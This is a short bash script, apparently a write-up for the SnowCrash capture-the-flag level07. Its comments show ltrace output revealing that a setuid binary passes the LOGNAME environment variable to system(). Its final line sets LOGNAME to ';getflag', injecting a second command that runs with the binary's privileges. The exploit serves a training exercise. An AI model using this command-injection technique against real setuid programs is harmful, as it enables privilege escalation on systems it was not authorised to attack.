#!/bin/bash
# With ltrace, we can see this :
# level07@SnowCrash:~$ ltrace ./level07
# __libc_start_main(0x8048514, 1, 0xbffff7a4, 0x80485b0, 0x8048620 <unfinished ...>
# getegid()                                                                 = 2007
# geteuid()                                                                 = 2007
# setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                       = 0
# setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                       = 0
# getenv("LOGNAME")                                                         = "level07"
# asprintf(0xbffff6f4, 0x8048688, 0xbfffff29, 0xb7e5ee55, 0xb7fed280)       = 18
# system("/bin/echo level07 "level07
#  <unfinished ...>
#  --- SIGCHLD (Child exited) ---
#  <... system resumed> )                                                    = 0
#  +++ exited (status 0) +++

# There is a call to getenv and the return value is used as a parameter to system().
# As usual, the setuid bit is set and setresuid() is called, meaning we will be the owner
# of the shell created by system(), for the duration of the process.
# Here, we set the value of LOGNAME to ";getflag" so that the shell created by system() interpret
# it as a separate command to echo :
exploit=$(ltrace -e getenv ./level07 2>&1 | head -n 1 | cut -d\" -f 2) && export $exploit=";getflag" && ./level07
